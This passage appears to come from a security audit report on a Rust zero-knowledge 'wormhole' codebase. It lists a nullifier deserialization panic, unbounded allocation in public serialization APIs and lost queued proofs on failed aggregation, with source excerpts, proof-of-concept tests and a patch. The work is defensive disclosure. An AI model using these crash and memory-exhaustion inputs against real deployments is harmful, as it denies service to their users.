            .map_err(|_| anyhow::anyhow!("Failed to deserialize nullifier secret"))?;
        offset += SECRET_NUM_TARGETS;

        // Deserialize transfer_count
        let transfer_count = elements[offset..offset + TRANSFER_COUNT_NUM_TARGETS]
            .try_into()
            .map_err(|_| anyhow::anyhow!("Failed to deserialize nullifier transfer_count"))?;

        Ok(Self {
            hash,
            secret,
            transfer_count,
        })
    }
```

### `common/src/serialization.rs` (2 locations)
#### Lines 39-48 — _`as_32_bit_limb` rejects oversized limb values._

```
fn as_32_bit_limb(v: u64, index: usize) -> Result<u64, String> {
    if v <= BIT_32_LIMB_MASK {
        Ok(v)
    } else {
        Err(alloc::format!(
            "Felt at index {} with value {} exceeds 32-bit limb size",
            index,
            v
        ))
    }
```

⋯
#### Lines 95-101 — _`try_felts_to_u64` applies the 32-bit limb check used by `felts_to_u64`._ — _The underlying conversion rejects non-32-bit limb values._

```
pub fn try_felts_to_u64(felts: [F; FELTS_PER_U64]) -> Result<u64, String> {
    let mut out = 0u64;
    for (i, felt) in felts.into_iter().enumerate() {
        let limb = as_32_bit_limb(to_u64(felt), i)?;
        out |= limb << (32 - 32 * i);
    }
    Ok(out)
```

### `wormhole/circuit/src/lib.rs`
#### Lines 5-16 — _The nullifier module and codec traits are public API of the circuit crate._

```
pub mod block_header;
pub mod circuit;
pub mod inputs;
pub mod nullifier;
#[cfg(feature = "profile")]
pub mod profile;
pub mod substrate_account;
pub mod unspendable_account;
pub mod zk_merkle_proof; // 4-ary Poseidon Merkle proof

// Re-export codec traits from common for convenience
pub use zk_circuits_common::codec::{ByteCodec, FieldElementCodec};
```

## Description

`Nullifier` accepts attacker-controlled field-element encodings through `from_field_elements`, but that constructor only checks slice length and structural layout before storing the final two felts directly as `transfer_count`. Later, `to_bytes` treats those same felts as canonical 32-bit limbs and calls `felts_to_u64(self.transfer_count).unwrap()`. The underlying conversion rejects any limb larger than `0xffff_ffff`, so a syntactically valid `Nullifier` can be created in an invalid internal state and will panic during ordinary byte serialization. Because the codec traits and `nullifier` module are exposed through the public API, this invariant mismatch is reachable for downstream callers handling externally supplied felts. The fix is to enforce the limb range during `from_field_elements` or otherwise make `to_bytes` handle malformed `transfer_count` values without panicking.

## Root cause

`Nullifier::from_field_elements` does not enforce the 32-bit limb invariant required for `transfer_count`, while `Nullifier::to_bytes` assumes that invariant and unwraps the fallible `felts_to_u64` conversion.

## Impact

A caller that deserializes attacker-controlled nullifier felts can be crashed later when the value is serialized for caching, forwarding, logging, or other routine processing. This turns malformed input into an availability failure at a later safe API boundary instead of returning a recoverable validation error when the data is first parsed.

## Proof of concept

### Test case

```
use std::panic::{catch_unwind, AssertUnwindSafe};

use plonky2::field::types::Field;
use qp_wormhole_inputs::BytesDigest;
use wormhole_circuit::nullifier::Nullifier;
use wormhole_circuit::{ByteCodec, FieldElementCodec};
use zk_circuits_common::circuit::F;

#[test]
fn nullifier_field_decode_accepts_malformed_transfer_count_then_panics_on_to_bytes() {
    let valid = Nullifier::from_preimage(BytesDigest::new_unchecked([7u8; 32]), 42);
    let mut attacker_felts = valid.to_field_elements();

    let oversized_32_bit_limb = F::from_noncanonical_u64(0x1_0000_0000);
    let last_index = attacker_felts.len() - 1;
    attacker_felts[last_index] = oversized_32_bit_limb;

    let malformed = Nullifier::from_field_elements(&attacker_felts)
        .expect("from_field_elements should accept the attacker-controlled felt layout");

    let serialization_panic = catch_unwind(AssertUnwindSafe(|| malformed.to_bytes()));
    assert!(
        serialization_panic.is_err(),
        "accepted malformed nullifier should panic when later serialized"
    );
}
```

### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   wormhole/tests/tests/poc.rs

# install dependencies
cargo +'1.93.0' fetch --locked --manifest-path 'Cargo.toml'

# build and run
cargo build --tests --workspace
cargo test -p tests --test poc
```

### Output

```
[output truncated: 27 lines & 0.86328125 KB skipped]


</test-stdout>

<test-stderr>
   Compiling tests v3.0.0 (/repo/wormhole/tests)
    Finished `test` profile [unoptimized + debuginfo] target(s) in 0.57s
     Running tests/poc.rs (target/debug/deps/poc-76feceaa046eb0ff)

</test-stderr>
```

### Considerations

PoC demonstrates the full public-API chain in-process: `Nullifier::from_field_elements` accepts attacker-controlled oversized transfer-count felts and a later `Nullifier::to_bytes` call panics. The harness catches the panic with `catch_unwind` so the test can assert it; in a panic-abort or uncaught-panic deployment this would terminate the caller instead of returning an error.

### Validation reasoning

PoC validation command completed successfully.

## Remediation

### Explanation

Reject malformed Nullifier transfer_count felts during from_field_elements by reusing the existing 32-bit limb conversion, preventing invalid internal state that later panics in to_bytes.

### Patch

```diff
diff --git a/wormhole/circuit/src/nullifier.rs b/wormhole/circuit/src/nullifier.rs
--- a/wormhole/circuit/src/nullifier.rs
+++ b/wormhole/circuit/src/nullifier.rs
@@ -1,281 +1,284 @@
 use alloc::vec::Vec;
 use core::array;
 use core::mem::size_of;
 use zk_circuits_common::utils::bytes_to_digest;
 use zk_circuits_common::utils::digest_to_bytes;
 use zk_circuits_common::utils::felts_to_u64;
 use zk_circuits_common::utils::DIGEST_BYTES_LEN;
 use zk_circuits_common::utils::FELTS_PER_U128;
 use zk_circuits_common::utils::FELTS_PER_U64;
 use zk_circuits_common::utils::POSEIDON2_OUTPUT;
 
 use crate::inputs::CircuitInputs;
 use plonky2::{
     hash::{hash_types::HashOutTarget, poseidon2::Poseidon2Hash},
     iop::{
         target::Target,
         witness::{PartialWitness, WitnessWrite},
     },
     plonk::{circuit_builder::CircuitBuilder, config::Hasher},
 };
 use zk_circuits_common::circuit::{CircuitFragment, D, F};
 use zk_circuits_common::codec::{ByteCodec, FieldElementCodec};
 use zk_circuits_common::utils::{string_to_felts, u64_to_felts, BytesDigest, Digest};
 
 pub const SALT_BYTES_LEN: usize = 8;
 pub const NULLIFIER_SALT: &str = "~nullif~";
 
 // Compile-time check: require NULLIFIER_SALT to have exactly SALT_BYTES_LEN bytes
 const _: () = {
     assert!(
         NULLIFIER_SALT.len() == SALT_BYTES_LEN,
         "invalid NULLIFIER_SALT length"
     );
 };
 pub const SECRET_BYTES_LEN: usize = 32;
 /// Number of field elements for the secret (32 bytes with 8 bytes/felt encoding)
 pub const SECRET_NUM_TARGETS: usize = POSEIDON2_OUTPUT; // 4
 pub const SALT_NUM_TARGETS: usize = 3;
 pub const FUNDING_ACCOUNT_NUM_TARGETS: usize = FELTS_PER_U128;
 pub const TRANSFER_COUNT_NUM_TARGETS: usize = FELTS_PER_U64;
 pub const PREIMAGE_NUM_TARGETS: usize =
     SECRET_NUM_TARGETS + SALT_NUM_TARGETS + FUNDING_ACCOUNT_NUM_TARGETS;
 pub const NULLIFIER_SIZE_FELTS: usize =
     POSEIDON2_OUTPUT + SECRET_NUM_TARGETS + TRANSFER_COUNT_NUM_TARGETS;
 
 /// Type alias for the secret as a fixed-size array (4 field elements for 32 bytes)
 pub type Secret = Digest;
 
 #[derive(Debug, PartialEq, Eq, Clone)]
 pub struct Nullifier {
     pub hash: Digest,
     /// Secret encoded with 8 bytes/felt (4 field elements for 32 bytes)
     pub secret: Secret,
     transfer_count: [F; TRANSFER_COUNT_NUM_TARGETS],
 }
 
 impl Nullifier {
     pub fn new(digest: BytesDigest, secret: BytesDigest, transfer_count: u64) -> Self {
         let hash = bytes_to_digest(digest);
         // Use 8 bytes/felt encoding.
         let secret = bytes_to_digest(secret);
         let transfer_count = u64_to_felts(transfer_count);
 
         Self {
             hash,
             secret,
             transfer_count,
         }
     }
 
     pub fn from_preimage(secret: BytesDigest, transfer_count: u64) -> Self {
         let mut preimage = Vec::new();
 
         let salt = string_to_felts(NULLIFIER_SALT);
         let secret_felts = bytes_to_digest(secret);
         let transfer_count_felts = u64_to_felts(transfer_count);
 
         preimage.extend(salt);
         preimage.extend(secret_felts);
         preimage.extend(transfer_count_felts);
 
         let inner_hash = Poseidon2Hash::hash_no_pad(&preimage).elements;
         let outer_hash = Poseidon2Hash::hash_no_pad(&inner_hash).elements;
         let hash = Digest::from(outer_hash);
 
         Self {
             hash,
             secret: secret_felts,
             transfer_count: transfer_count_felts,
         }
     }
 }
 
 impl ByteCodec for Nullifier {
     fn to_bytes(&self) -> Vec<u8> {
         let mut bytes = Vec::new();
         bytes.extend(*digest_to_bytes(self.hash));
         bytes.extend(*digest_to_bytes(self.secret));
         let transfer_count_uint = felts_to_u64(self.transfer_count).unwrap();
         bytes.extend(transfer_count_uint.to_le_bytes());
         bytes
     }
 
     fn from_bytes(slice: &[u8]) -> anyhow::Result<Self> {
         let hash_size = DIGEST_BYTES_LEN;
         let secret_size = SECRET_BYTES_LEN;
         let transfer_count_size = size_of::<u64>();
         let total_size = hash_size + secret_size + transfer_count_size;
 
         if slice.len() != total_size {
             return Err(anyhow::anyhow!(
                 "Expected {} bytes for Nullifier, got: {}",
                 total_size,
                 slice.len()
             ));
         }
 
         let mut offset = 0;
         // Deserialize hash
         let digest = slice[offset..offset + hash_size].try_into().map_err(|e| {
             anyhow::anyhow!("Failed to deserialize nullifier hash with error: {:?}", e)
         })?;
         let hash = bytes_to_digest(digest);
         offset += hash_size;
 
         // Deserialize secret (32 bytes -> 4 field elements)
         let secret_bytes: BytesDigest =
             slice[offset..offset + secret_size]
                 .try_into()
                 .map_err(|e| {
                     anyhow::anyhow!("Failed to deserialize nullifier secret with error: {:?}", e)
                 })?;
         let secret = bytes_to_digest(secret_bytes);
         offset += secret_size;
 
         // Deserialize transfer_count
         // Read as u64 and then convert to felts to ensure proper encoding
         let transfer_count_u64 = u64::from_le_bytes(
             slice[offset..offset + transfer_count_size]
                 .try_into()
                 .map_err(|e| {
                     anyhow::anyhow!(
                         "Failed to deserialize nullifier transfer_count with error: {:?}",
                         e
                     )
                 })?,
         );
         let transfer_count = u64_to_felts(transfer_count_u64);
 
         Ok(Self {
             hash,
             secret,
             transfer_count,
         })
     }
 }
 
 impl FieldElementCodec for Nullifier {
     fn to_field_elements(&self) -> Vec<F> {
         let mut elements = Vec::new();
         elements.extend(self.hash.to_vec());
         elements.extend(self.secret);
         elements.extend(self.transfer_count);
         elements
     }
 
     fn from_field_elements(elements: &[F]) -> anyhow::Result<Self> {
         if elements.len() != NULLIFIER_SIZE_FELTS {
             return Err(anyhow::anyhow!(
                 "Expected {} field elements for Nullifier, got: {}",
                 NULLIFIER_SIZE_FELTS,
                 elements.len()
             ));
         }
 
         let mut offset = 0;
         // Deserialize hash
         let hash: Digest = elements[offset..offset + POSEIDON2_OUTPUT]
             .try_into()
             .map_err(|_| anyhow::anyhow!("Failed to deserialize nullifier hash"))?;
         offset += POSEIDON2_OUTPUT;
 
         // Deserialize secret (4 field elements)
         let secret: Secret = elements[offset..offset + SECRET_NUM_TARGETS]
             .try_into()
             .map_err(|_| anyhow::anyhow!("Failed to deserialize nullifier secret"))?;
         offset += SECRET_NUM_TARGETS;
 
         // Deserialize transfer_count
         let transfer_count = elements[offset..offset + TRANSFER_COUNT_NUM_TARGETS]
             .try_into()
             .map_err(|_| anyhow::anyhow!("Failed to deserialize nullifier transfer_count"))?;
+        felts_to_u64(transfer_count).map_err(|err| {
+            anyhow::anyhow!("Failed to deserialize nullifier transfer_count: {}", err)
+        })?;
 
         Ok(Self {
             hash,
             secret,
             transfer_count,
         })
     }
 }
 
 impl From<&CircuitInputs> for Nullifier {
     fn from(inputs: &CircuitInputs) -> Self {
         Self::new(
             inputs.public.nullifier,
             inputs.private.secret,
             inputs.private.transfer_count,
         )
     }
 }
 
 #[derive(Debug, Clone)]
 pub struct NullifierTargets {
     pub hash: HashOutTarget,
     /// Secret targets
     pub secret: HashOutTarget,
     pub transfer_count: [Target; TRANSFER_COUNT_NUM_TARGETS],
 }
 
 impl NullifierTargets {
     pub fn new(builder: &mut CircuitBuilder<F, D>) -> Self {
         Self {
             hash: builder.add_virtual_hash_public_input(),
             secret: builder.add_virtual_hash(),
             transfer_count: array::from_fn(|_| builder.add_virtual_target()),
         }
     }
 }
 
 impl CircuitFragment for Nullifier {
     type Targets = NullifierTargets;
 
     /// Builds nullifier targets but does NOT enforce hash validation here.
     /// The nullifier hash validation is made conditional on block_hash != 0
     /// in `connect_shared_targets()` to allow dummy proofs to use random nullifiers.
     fn circuit(
         &Self::Targets {
             hash: _,
             secret: _,
             transfer_count: _,
         }: &Self::Targets,
         _builder: &mut CircuitBuilder<F, D>,
     ) {
         // NOTE: Nullifier hash validation (nullifier == H(H(salt + secret + transfer_count)))
         // is enforced conditionally in connect_shared_targets() based on block_hash != 0.
         // This allows dummy proofs to use random nullifiers for better privacy.
     }
 
     fn fill_targets(
         &self,
         pw: &mut PartialWitness<F>,
         targets: Self::Targets,
     ) -> anyhow::Result<()> {
         pw.set_hash_target(targets.hash, self.hash.into())?;
         pw.set_hash_target(targets.secret, self.secret.into())?;
         pw.set_target_arr(&targets.transfer_count, &self.transfer_count)?;
         Ok(())
     }
 }
 
 /// Adds unconditional nullifier hash validation: hash == H(H(salt + secret + transfer_count)).
 /// Use this for isolated testing of Nullifier. The full WormholeCircuit uses
 /// a conditional version in connect_shared_targets() to support dummy proofs.
 pub fn add_nullifier_validation(targets: &NullifierTargets, builder: &mut CircuitBuilder<F, D>) {
     use plonky2::hash::poseidon2::Poseidon2Hash;
     use zk_circuits_common::utils::string_to_felts;
 
     let salt_felts = string_to_felts(NULLIFIER_SALT);
     let mut nullifier_preimage = Vec::new();
     for &f in salt_felts.iter() {
         nullifier_preimage.push(builder.constant(f));
     }
     nullifier_preimage.extend(targets.secret.elements.iter().copied());
     nullifier_preimage.extend(targets.transfer_count.iter());
 
     let inner_hash = builder.hash_n_to_hash_no_pad_p2::<Poseidon2Hash>(nullifier_preimage);
     let computed_nullifier =
         builder.hash_n_to_hash_no_pad_p2::<Poseidon2Hash>(inner_hash.elements.to_vec());
 
     builder.connect_hashes(targets.hash, computed_nullifier);
 }
```

### Affected files
- `wormhole/circuit/src/nullifier.rs`

### Validation output

```
[output truncated: 102 lines & 6.6533203125 KB skipped]

   Compiling qp-wormhole-circuit v3.0.0 (/repo/wormhole/circuit)
   Compiling qp-wormhole-prover v3.0.0 (/repo/wormhole/prover)
   Compiling test-helpers v3.0.0 (/repo/wormhole/tests/test-helpers)
   Compiling qp-wormhole-aggregator v3.0.0 (/repo/wormhole/aggregator)
   Compiling qp-wormhole-circuit-builder v3.0.0 (/repo/wormhole/circuit-builder)
   Compiling tests v3.0.0 (/repo/wormhole/tests)
    Finished `test` profile [unoptimized + debuginfo] target(s) in 8.66s
     Running tests/poc.rs (target/debug/deps/poc-76feceaa046eb0ff)
error: test failed, to rerun pass `-p tests --test poc`
```

---

# Unbounded public APIs allow allocation-based DoS
**#97066**
- Severity: Medium
- Validity: Unreviewed

## Source locations

### `common/src/circuit.rs`
#### Lines 17-23 — _Public Deserialize struct with unbounded storage_proof/indices and no validation_

```
#[derive(Debug, Deserialize)]
pub struct TransferProofJson {
    pub transfer_count: u64,
    pub state_root: String,         // hex (no 0x)
    pub storage_proof: Vec<String>, // hex-encoded nodes
    pub indices: Vec<usize>,
}
```

### `common/src/lib.rs`
#### Lines 5-9 — _The common crate publicly exports the `utils` and `serialization` modules._ — _pub mod circuit re-exports the type as public API_

```
pub mod circuit;
pub mod codec;
pub mod gadgets;
pub mod serialization;
pub mod utils;
```

### `common/src/utils.rs`
#### Lines 46-63 — _Public wrappers accept variable-length strings, byte slices, and felt slices and return allocated `Vec` results._

```
/// Encodes a string into field elements.
pub fn string_to_felts(input: &str) -> Vec<F> {
    serialization::string_to_felts(input)
}

/// Converts bytes to field elements (4 bytes/felt + terminator).
pub fn bytes_to_felts(input: &[u8]) -> Vec<F> {
    serialization::bytes_to_felts(input)
}

/// Converts bytes to field elements using compact encoding (8 bytes/felt).
pub fn bytes_to_felts_compact(input: &[u8]) -> Vec<F> {
    serialization::bytes_to_felts_compact(input)
}

/// Converts field elements back to bytes.
pub fn felts_to_bytes(input: &[F]) -> Result<Vec<u8>, String> {
    serialization::felts_to_bytes(input).map_err(|e| e.to_string())
```

### `common/src/serialization.rs` (3 locations)
#### Lines 109-117 — _The standard byte encoder converts the full input through the delegated word conversion and collects every element into a `Vec<F>`._

```
/// Convert variable-length bytes to field elements.
///
/// Uses 4 bytes per field element with a terminator marker (0x01) appended,
/// ensuring different-length inputs always produce different field element sequences.
pub fn bytes_to_felts(input: &[u8]) -> Vec<F> {
    qp_poseidon_core::serialization::bytes_to_u64s(input)
        .into_iter()
        .map(from_u64)
        .collect()
```

⋯
#### Lines 124-127 — _The felt decoder materializes the whole input as a `Vec<u64>` before delegated validation/decoding._

```
pub fn felts_to_bytes(input: &[F]) -> Result<Vec<u8>, &'static str> {
    let u64s: Vec<u64> = input.iter().map(|f| to_u64(*f)).collect();
    qp_poseidon_core::serialization::u64s_to_bytes(&u64s)
}
```

⋯
#### Lines 138-149 — _The compact byte encoder is another variable-length path that collects the complete delegated conversion into a `Vec<F>`._

```
/// Convert variable-length bytes to field elements using compact encoding (8 bytes/felt).
///
/// Unlike `bytes_to_felts` (4 bytes/felt + terminator), this uses the full
/// 8-byte capacity of each field element. Input is zero-padded to align to 8 bytes.
///
/// Use this for trie node hashing where collision resistance is provided by the
/// trie structure rather than the encoding.
pub fn bytes_to_felts_compact(input: &[u8]) -> Vec<F> {
    qp_poseidon_core::serialization::bytes_to_u64s_compact(input)
        .into_iter()
        .map(from_u64)
        .collect()
```

## Description

The common crate exposes multiple public entry points that accept attacker-sized variable-length input and immediately materialize it into heap-backed collections without enforcing any maximum size. `TransferProofJson` derives `Deserialize` with unbounded `storage_proof` and `indices` vectors, so downstream consumers can obtain arbitrarily large values straight from untrusted JSON before any semantic checks run. The public `utils` and `serialization` helpers likewise accept caller-sized `&str`, `&[u8]`, and `&[F]` inputs and build full `Vec` outputs via `.collect()` or an intermediate `Vec<u64>`, with no recoverable size-limit failure at this layer. Although the current repository does not appear to deserialize `TransferProofJson` itself, both APIs are part of the exported library surface and are available to downstream services. The fix pattern is the same across these paths: enforce explicit input-size bounds at the public boundary, and make oversized inputs fail before large allocation occurs.

## Root cause

The crate's public serialization and deserialization APIs trust caller-controlled collection lengths and variable-length inputs, allocating `Vec` storage before any built-in size validation rejects oversized data.

## Impact

A downstream service, verifier, or FFI boundary that feeds untrusted data through these exported APIs can be pushed into large heap allocations and process instability or termination. In practice, an attacker may deny proof generation, verification, or related request handling until the malicious request path is removed or the worker is restarted.

## Proof of concept

### Test case

```
use circuit_builder as _;
use qp_wormhole_inputs as _;
use std::alloc::{GlobalAlloc, Layout, System};
use std::env;
use std::hint::black_box;
use std::process::Command;
use std::ptr::null_mut;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use wormhole_aggregator as _;
use wormhole_circuit as _;
use wormhole_prover as _;
use wormhole_verifier as _;
use zk_circuits_common as _;

struct BudgetAllocator;

static BUDGET_ENABLED: AtomicBool = AtomicBool::new(false);
static BYTES_REMAINING: AtomicUsize = AtomicUsize::new(usize::MAX);

#[global_allocator]
static GLOBAL_ALLOCATOR: BudgetAllocator = BudgetAllocator;

impl BudgetAllocator {
    fn charge(size: usize) -> bool {
        if !BUDGET_ENABLED.load(Ordering::SeqCst) || size == 0 {
            return true;
        }

        let mut remaining = BYTES_REMAINING.load(Ordering::SeqCst);
        loop {
            if remaining < size {
                return false;
            }
            match BYTES_REMAINING.compare_exchange(
                remaining,
                remaining - size,
                Ordering::SeqCst,
                Ordering::SeqCst,
            ) {
                Ok(_) => return true,
                Err(actual) => remaining = actual,
            }
        }
    }
}

unsafe impl GlobalAlloc for BudgetAllocator {
    unsafe fn alloc(&self, layout: Layout) -> *mut u8 {
        if !Self::charge(layout.size()) {
            return null_mut();
        }
        unsafe { System.alloc(layout) }
    }

    unsafe fn alloc_zeroed(&self, layout: Layout) -> *mut u8 {
        if !Self::charge(layout.size()) {
            return null_mut();
        }
        unsafe { System.alloc_zeroed(layout) }
    }

    unsafe fn realloc(&self, ptr: *mut u8, layout: Layout, new_size: usize) -> *mut u8 {
        if !Self::charge(new_size) {
            return null_mut();
        }
        unsafe { System.realloc(ptr, layout, new_size) }
    }

    unsafe fn dealloc(&self, ptr: *mut u8, layout: Layout) {
        unsafe { System.dealloc(ptr, layout) }
    }
}

const CHILD_ENV: &str = "QP_POC_CHILD";
const INPUT_BYTES_ENV: &str = "QP_POC_INPUT_BYTES";
const ALLOCATION_BUDGET_BYTES: usize = 64 * 1024 * 1024;
const SMALL_INPUT_BYTES: usize = 4 * 1024 * 1024;
const LARGE_INPUT_BYTES: usize = 24 * 1024 * 1024;

fn child_mode() -> bool {
    env::var(CHILD_ENV).ok().as_deref() == Some("bytes_to_felts")
}

fn configured_input_len() -> usize {
    env::var(INPUT_BYTES_ENV)
        .expect("child input length must be configured")
        .parse()
        .expect("child input length must parse")
}

fn spawn_child(test_name: &str, input_len: usize) -> std::process::Output {
    Command::new(env::current_exe().expect("current test binary path"))
        .env(CHILD_ENV, "bytes_to_felts")
        .env(INPUT_BYTES_ENV, input_len.to_string())
        .arg("--exact")
        .arg(test_name)
        .arg("--nocapture")
        .arg("--test-threads=1")
        .output()
        .expect("child test process must start")
}

#[test]
fn unbounded_bytes_to_felts_allows_attacker_sized_allocation_spikes() {
    let small = spawn_child("budgeted_bytes_to_felts_worker", SMALL_INPUT_BYTES);
    assert!(
        small.status.success(),
        "small request should fit within the worker budget:\nstdout:\n{}\nstderr:\n{}",
        String::from_utf8_lossy(&small.stdout),
        String::from_utf8_lossy(&small.stderr)
    );

    let large = spawn_child("budgeted_bytes_to_felts_worker", LARGE_INPUT_BYTES);
    assert!(
        !large.status.success(),
        "large attacker-sized request unexpectedly stayed within budget:\nstdout:\n{}\nstderr:\n{}",
        String::from_utf8_lossy(&large.stdout),
        String::from_utf8_lossy(&large.stderr)
    );
}

#[test]
fn budgeted_bytes_to_felts_worker() {
    if !child_mode() {
        return;
    }

    let attacker_payload = vec![0x41u8; configured_input_len()];

    BYTES_REMAINING.store(ALLOCATION_BUDGET_BYTES, Ordering::SeqCst);
    BUDGET_ENABLED.store(true, Ordering::SeqCst);

    let encoded = zk_circuits_common::utils::bytes_to_felts(&attacker_payload);
    black_box(encoded.len());
}
```

### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   wormhole/tests/tests/poc.rs

# install dependencies
cargo +'1.93.0' fetch --locked --manifest-path 'Cargo.toml'

# build and run
cargo build --tests --workspace
cargo test -p tests --test poc
```

### Output

```
[output truncated: 28 lines & 0.8916015625 KB skipped]


</test-stdout>

<test-stderr>
   Compiling tests v3.0.0 (/repo/wormhole/tests)
    Finished `test` profile [unoptimized + debuginfo] target(s) in 0.76s
     Running tests/poc.rs (target/debug/deps/poc-76feceaa046eb0ff)

</test-stderr>
```

### Considerations

PoC exercises the real public API `zk_circuits_common::utils::bytes_to_felts` in-process and shows a large attacker-controlled payload kills a memory-capped worker, but it models the worker cap with the test binary’s global allocator rather than the OS OOM killer. It does not exercise `TransferProofJson`, because the repository has no in-repo public entry point that deserializes untrusted JSON into that type.

### Validation reasoning

PoC validation command completed successfully.

---

# Queued proofs can be poisoned and lost on failed aggregation
**#97067**
- Severity: Medium
- Validity: Unreviewed

## Source locations

### `wormhole/aggregator/src/aggregator.rs` (3 locations)
#### Lines 129-140 — _`take_all` clears the buffered proofs before returning them to callers._ — _`take_all` clears the proof buffer by replacing it with an empty vector._

```
    fn push(&mut self, proof: Proof) -> Result<()> {
        if self.buf.len() >= self.cap {
            bail!("proof buffer is full (capacity = {})", self.cap);
        }
        self.buf.push(proof);
        Ok(())
    }

    /// Take all currently buffered proofs (clears buffer).
    fn take_all(&mut self) -> Vec<Proof> {
        std::mem::take(&mut self.buf)
    }
```

⋯
#### Lines 184-223 — _Public-batch enqueue checks only PI length, and aggregation drains before committing/proving._ — _The public-batch path enqueues proofs after shape-only checks and drains them before fallible prover setup, commit, and prove steps._ — _Public-batch admission validates only private-batch proof public-input length before enqueueing._ — _Public-batch aggregation drains the buffer before fallible prover loading, commit, and prove operations._

```
impl AggregationBackend for PublicBatchAggregator {
    fn push_proof(&mut self, proof: Proof) -> Result<()> {
        ensure_proof_public_input_len(
            &proof,
            self.expected_private_batch_pi_len,
            "private-batch aggregated proof",
        )?;
        self.buf.push(proof)
    }

    fn buffer_len(&self) -> usize {
        self.buf.len()
    }

    fn batch_size(&self) -> usize {
        self.buf.cap()
    }

    fn aggregate(&mut self) -> Result<Proof> {
        if self.buf.is_empty() {
            bail!("there are no private-batch proofs to aggregate");
        }

        // Partial batches are fine: PublicBatchProver::commit pads with the dummy
        // private-batch proof template (no shuffle - forwarding stays order-preserving
        // so the chain can attribute each segment to its inner proof).
        let batch = self.buf.take_all();

        // Load the public-batch prover
        let prover = PublicBatchProver::new_from_binaries_dir(&self.bins_dir)
            .context("failed to load prebuilt public-batch prover")?;

        let prover = prover
            .commit(PublicBatchInputs {
                proofs: batch,
                aggregator_address: self.aggregator_address,
            })
            .context("failed to commit private-batch proofs to public-batch prover")?;

        prover.prove().context("public-batch proving failed")
```

⋯
#### Lines 283-326 — _Private-batch enqueue checks only PI length, and aggregation drains before padding checks and proving._ — _The private-batch path also drains first, then performs padding-compatibility checks and fallible commit/prove with no rollback._ — _Private-batch proof admission checks only the public-input length before buffering._ — _Private-batch admission validates only leaf proof public-input length before enqueueing._ — _Private-batch aggregation drains before the partial-batch asset check and before fallible commit/prove._

```
impl AggregationBackend for PrivateBatchAggregator {
    fn push_proof(&mut self, proof: Proof) -> Result<()> {
        ensure_proof_public_input_len(&proof, self.expected_leaf_pi_len, "leaf proof")?;
        self.buf.push(proof)
    }

    fn buffer_len(&self) -> usize {
        self.buf.len()
    }

    fn batch_size(&self) -> usize {
        self.buf.cap()
    }

    fn aggregate(&mut self) -> Result<Proof> {
        if self.buf.is_empty() {
            bail!("there are no leaf proofs to aggregate");
        }

        // Private-batch prover commit does padding/shuffling/dummy-nullifier-preimage handling,
        // so we can pass any non-empty batch. The wrapper's same-block / same-asset invariants are
        // intentional protocol rules and remain enforced in-circuit; this preflight only rejects
        // malformed or dummy-padding-incompatible inputs earlier.
        let proofs = self.buf.take_all();
        if proofs.len() < self.batch_size() {
            for (idx, proof) in proofs.iter().enumerate() {
                let asset_id = leaf_proof_asset_id(proof)?;
                if asset_id != 0 {
                    bail!(
                        "proof {} has asset_id={}, but private-batch dummy padding requires all real proofs to use asset_id=0",
                        idx,
                        asset_id
                    );
                }
            }
        }

        let prover = self.build_prover()?;
        let prover = prover
            .commit(proofs)
            .context("failed to commit leaf proofs to private-batch aggregation prover")?;

        prover.prove().context("private-batch proving failed")
    }
```

### `wormhole/aggregator/src/common/utils.rs`
#### Lines 33-48 — _The helper used at admission checks only the public-input vector length._

```
pub fn ensure_proof_public_input_len(
    proof: &ProofWithPublicInputs<F, C, D>,
    expected_len: usize,
    label: &str,
) -> Result<()> {
    let actual_len = proof.public_inputs.len();
    if actual_len != expected_len {
        return Err(anyhow!(
            "{} public input length mismatch: expected {}, got {}",
            label,
            expected_len,
            actual_len
        ));
    }

    Ok(())
```

### `wormhole/aggregator/src/private_batch/circuit/circuit_logic.rs`
#### Lines 207-233 — _The private-batch circuit enforces block, asset, and fee consistency only during recursive aggregation._

```
    // Block consistency + asset consistency + volume_fee_bps consistency
    // =========================================================================
    //
    // Constraint for each proof i:
    //   is_dummy_i OR (block_i == block_ref)
    //
    // Since block_ref is the first non-dummy slot's block hash, this forces every real
    // proof to share that same block, regardless of slot order.
    //
    // Also enforce:
    //   asset_id_i == asset_ref
    //   volume_fee_bps_i == volume_fee_bps_ref

    for (i, pis_i) in leaf_pi_targets.iter().take(n_leaf).enumerate() {
        let matches_ref = bytes_digest_eq(builder, block_hashes[i], block_ref);

        // Enforce `is_dummy_i OR matches_ref == true`
        let valid_block_relation = builder.or(is_dummy_flags[i], matches_ref);
        builder.connect(valid_block_relation.target, one);

        // Enforce asset_id consistency
        let asset_i = limb1_at_offset::<LEAF_PI_LEN, ASSET_ID_START>(pis_i, 0);
        builder.connect(asset_i, asset_ref);

        // Enforce volume_fee_bps consistency
        let volume_fee_bps_i = limb1_at_offset::<LEAF_PI_LEN, VOLUME_FEE_BPS_START>(pis_i, 0);
        builder.connect(volume_fee_bps_i, volume_fee_bps_ref);
```

### `wormhole/aggregator/src/public_batch/circuit/circuit_logic.rs`
#### Lines 238-255 — _The public-batch circuit enforces non-dummy inner proof metadata consistency during recursive aggregation._

```
    // 3) Enforce asset/fee/block consistency across all non-dummy private-batch
    //    proofs: `is_dummy_i OR matches_ref`.
    //    block_number is not checked here: each inner private-batch proof already
    //    binds block_hash and block_number together (via the leaf header parse), so
    //    block_hash equality transitively pins the number.
    for (i, pis_i) in private_batch_pi_targets.iter().take(n_inner).enumerate() {
        let asset_matches = builder.is_equal(pis_i[pbc::PRIVATE_BATCH_ASSET_ID_OFFSET], asset_ref);
        let asset_ok = builder.or(is_dummy_flags[i], asset_matches);
        builder.connect(asset_ok.target, one);

        let fee_matches =
            builder.is_equal(pis_i[pbc::PRIVATE_BATCH_VOLUME_FEE_BPS_OFFSET], fee_ref);
        let fee_ok = builder.or(is_dummy_flags[i], fee_matches);
        builder.connect(fee_ok.target, one);

        let block_matches = bytes_digest_eq(builder, block_hashes[i], block_ref);
        let block_ok = builder.or(is_dummy_flags[i], block_matches);
        builder.connect(block_ok.target, one);
```

### `wormhole/aggregator/src/lib.rs`
#### Lines 1-5 — _The crate publicly exposes the aggregation modules._

```
pub mod aggregator;
pub mod common;
pub mod config;
pub mod dummy_proof;
pub mod private_batch;
```

### `wormhole/aggregator/src/private_batch/prover/mod.rs`
